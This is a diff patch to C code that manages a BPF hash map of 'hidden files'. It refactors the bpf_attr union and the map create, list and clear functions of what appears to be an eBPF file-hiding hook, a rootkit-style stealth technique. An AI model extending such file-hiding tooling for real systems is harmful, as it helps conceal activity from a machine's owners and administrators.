@@ -64,7 +64,7 @@ typedef union bpf_attr {
         __u32 map_flags;
         __u32 inner_map_fd;
         __u32 numa_node;
-    };
+    } create;
     struct {
         __u32 fd;
         __u64 attr;
@@ -77,6 +77,11 @@ typedef union bpf_attr {
         __u64 flags;
         __u64 batch;
     } elem;
+    struct {
+        __u32 map_fd;
+        __u64 key;
+        __u64 next_key;
+    } next_key;
     __u8 data[256];
 } bpf_attr_t;
 
@@ -93,11 +98,11 @@ static int bpf_sys(int cmd, bpf_attr_t *attr, unsigned int size)
 static int create_hidden_map(void)
 {
     bpf_attr_t attr = {
-        .map_type = BPF_MAP_TYPE_HASH,
-        .key_size = HIDDEN_FILES_SIZE,
-        .value_size = sizeof(__u32),
-        .max_entries = HIDDEN_FILES_MAX,
-        .map_flags = 0,
+        .create.map_type = BPF_MAP_TYPE_HASH,
+        .create.key_size = HIDDEN_FILES_SIZE,
+        .create.value_size = sizeof(__u32),
+        .create.max_entries = HIDDEN_FILES_MAX,
+        .create.map_flags = 0,
     };
     
     hidden_map_fd = bpf_sys(BPF_MAP_CREATE, &attr, sizeof(attr));
@@ -169,30 +174,30 @@ static void list_hidden_files(void)
     char key[HIDDEN_FILES_SIZE] = {};
     char next_key[HIDDEN_FILES_SIZE];
     int count = 0;
-    
+
     printf("[hook] === Hidden Files ===\n");
-    
+
     while (bpf_sys(BPF_MAP_GET_NEXT_KEY, &(bpf_attr_t){
-        .elem.map_fd = hidden_map_fd,
-        .elem.key = (__u64)(unsigned long)key,
-        .elem.next_key = (__u64)(unsigned long)next_key,
+        .next_key.map_fd = hidden_map_fd,
+        .next_key.key = (__u64)(unsigned long)key,
+        .next_key.next_key = (__u64)(unsigned long)next_key,
     }, sizeof(bpf_attr_t)) == 0) {
         __u32 val = 0;
-        
+
         /* Copy next_key to key for next iteration */
         memcpy(key, next_key, HIDDEN_FILES_SIZE);
-        
+
         /* Lookup value */
         bpf_sys(BPF_MAP_LOOKUP_ELEM, &(bpf_attr_t){
             .elem.map_fd = hidden_map_fd,
             .elem.key = (__u64)(unsigned long)key,
             .elem.value = (__u64)(unsigned long)&val,
         }, sizeof(bpf_attr_t));
-        
+
         printf("[hook]   %s (%s)\n", key, val == 2 ? "dir" : "file");
         count++;
     }
-    
+
     if (count == 0)
         printf("[hook]   (empty)\n");
 }
@@ -201,11 +206,11 @@ static void list_hidden_files(void)
 static void clear_hidden_list(void)
 {
     char key[HIDDEN_FILES_SIZE] = {};
-    
+
     while (bpf_sys(BPF_MAP_GET_NEXT_KEY, &(bpf_attr_t){
-        .elem.map_fd = hidden_map_fd,
-        .elem.key = (__u64)(unsigned long)key,
-        .elem.next_key = (__u64)(unsigned long)key,
+        .next_key.map_fd = hidden_map_fd,
+        .next_key.key = (__u64)(unsigned long)key,
+        .next_key.next_key = (__u64)(unsigned long)key,
     }, sizeof(bpf_attr_t)) == 0) {
         bpf_sys(BPF_MAP_DELETE_ELEM, &(bpf_attr_t){
             .elem.map_fd = hidden_map_fd,
